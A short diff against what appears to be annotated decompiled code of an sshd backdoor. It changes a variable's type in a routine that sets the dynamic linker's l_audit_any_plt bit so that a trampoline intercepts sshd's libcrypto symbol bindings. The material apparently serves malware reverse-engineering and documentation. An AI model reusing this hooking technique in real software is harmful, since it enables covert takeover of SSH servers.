@@ -31,7 +31,7 @@ BOOL backdoor_install_runtime_hooks(backdoor_setup_params_t *params)
   Elf64_Addr symbol_rva;
   Elf64_Ehdr *symbol_module_ehdr;
   sshd_ctx_t *live_sshd_ctx;
-  byte *audit_slot_byte;
+  LinkMapAuditFlags_t *audit_slot_byte;
   u32 *cpuid_leaf_ptr;
   u32 cpuid_edx;
   u32 cpuid_ebx;
@@ -889,7 +889,7 @@ LAB_00106bf0:
     (hooks_data->ldso_ctx).sshd_auditstate_bindflags_old_value = auditstate_snapshot;
     *resolved_count_ptr = LA_FLG_BINDFROM;
     // AutoDoc: Flip sshd’s `l_audit_any_plt` bit so `_dl_audit_symbind_alt` starts calling our symbind trampoline for every sshd→libcrypto PLT.
-    audit_slot_byte = (byte *)(hooks_data->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
+    audit_slot_byte = (hooks_data->ldso_ctx).sshd_link_map_l_audit_any_plt_addr;
     *audit_slot_byte = *audit_slot_byte | (hooks_data->ldso_ctx).link_map_l_audit_any_plt_bitmask;
     resolved_count_ptr = (u32 *)((long)&(loader_data.libcrypto_link_map)->l_name + link_map_delta);
     auditstate_snapshot = *resolved_count_ptr;
